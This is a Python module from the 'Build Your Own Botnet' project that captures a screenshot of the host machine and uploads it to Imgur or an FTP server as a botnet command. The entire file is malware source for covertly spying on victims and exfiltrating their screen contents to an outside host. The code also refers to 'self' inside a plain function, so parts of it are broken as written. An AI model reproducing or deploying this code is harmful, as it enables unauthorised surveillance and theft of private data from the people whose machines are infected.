#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

import mss

from util import Util

@Util.config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot upload=[method]')
def screenshot(args):
    """
    capture a screenshot from host device - upload methods: ftp, imgur
    """
    try:
        with mss.mss() as screen:
            img = screen.grab(screen.monitors[0])
        png     = Util.png(img)
        kwargs  = Util.kwargs(args)
        result  = Util.imgur(png) if ('upload' not in kwargs or kwargs.get('upload') == 'imgur') else self._upload_ftp(png, filetype='.png')
        return result
    except Exception as e:
        Util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))
